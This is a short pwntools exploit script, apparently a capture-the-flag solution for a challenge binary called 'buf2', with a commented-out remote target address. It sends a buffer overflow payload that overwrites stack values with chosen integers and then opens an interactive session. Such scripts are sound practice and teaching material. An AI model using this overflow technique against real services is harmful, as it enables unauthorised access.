from pwn import *

a = process('./buf2')
host, port = "34.80.245.238", 33334
# a = remote(host, port)
raw_input('debug')

a.recvuntil('Enter your name to start the challenge: ')
buf = 'a'*0x14
buf += p32(0x1c8)
buf += p32(0x7b)
a.sendline(buf)


a.interactive()